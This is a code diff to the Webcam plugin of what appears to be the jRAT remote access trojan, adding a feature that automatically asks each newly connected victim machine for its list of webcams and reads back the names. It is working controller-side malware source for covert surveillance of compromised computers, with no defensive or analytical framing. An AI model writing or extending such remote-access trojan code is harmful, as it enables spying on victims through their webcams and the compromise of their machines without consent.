@@ -7,13 +7,16 @@ import java.io.File;
 import java.io.FileInputStream;
 import java.io.FileNotFoundException;
 import java.util.ArrayList;
+import java.util.HashMap;
 import java.util.List;
+import java.util.Map;
 import java.util.Properties;
 
 import javax.swing.ImageIcon;
 
 import jrat.api.RATControlMenuEntry;
 import jrat.api.RATMenuItem;
+import jrat.api.RATObject;
 import jrat.api.RATPlugin;
 import jrat.api.Reader;
 import jrat.api.events.OnConnectEvent;
@@ -27,9 +30,12 @@ public class WebcamPlugin extends RATPlugin {
 
 	public static final String ICON_LOCATION = System.getProperty("jrat.dir") + File.separator + "/files/plugins/Webcam/icon.png";
 	public static final byte HEADER = 120;
+	public static final byte LIST_WEBCAM_HEADER = 121;
 
 	public static RATControlMenuEntry entry;
 	public static boolean enabled;
+	
+	public static Map<RATObject, List<String>> map = new HashMap<RATObject, List<String>>();
 
 	public void onEnable(OnEnableEvent event) throws Exception {
 		try {
@@ -77,10 +83,19 @@ public class WebcamPlugin extends RATPlugin {
 					panel.lbl.repaint();
 				}
 			}
+		} else if (event.getPacket().getHeader() == LIST_WEBCAM_HEADER) {
+			int len = event.getServer().getDataReader().readInt();
+			
+			List<String> webcams = new ArrayList<String>();
+			
+			for (int i = 0; i < len; i++) {
+				webcams.add(WebcamPlugin.readString(event.getServer().getDataReader()));
+				System.out.println(webcams.get(i));
+			}
 		}
 	}
 
-	private String readString(Reader dataReader) throws Exception {
+	public static String readString(Reader dataReader) throws Exception {
 		short len = dataReader.readShort();
 		StringBuffer buffer = new StringBuffer();
 		for (short s = 0; s < len; s++) {
@@ -106,17 +121,23 @@ public class WebcamPlugin extends RATPlugin {
 		return "jRAT";
 	}
 
-	// Server connected to us
-	public void onConnect(OnConnectEvent event) throws Exception {
-
+	public void onConnect(final OnConnectEvent event) throws Exception {
+		new Thread(new Runnable() {
+			public void run() {
+				try {
+					Thread.sleep(2000L);
+					event.getServer().addToSendQueue(new Packet121ListWebcams(event.getServer()));
+				} catch (Exception ex) {
+					ex.printStackTrace();
+				}
+			}
+		}).start();
 	}
 
-	// Server disconnected from us
 	public void onDisconnect(OnDisconnectEvent event) throws Exception {
 
 	}
 
-	// List of right click menu items, return null if none
 	public List<RATMenuItem> getMenuItems() {
 		List<RATMenuItem> list = new ArrayList<RATMenuItem>();
 		RATMenuItem entry = new RATMenuItem(new MenuListener(), "Webcam", new ImageIcon(ICON_LOCATION));
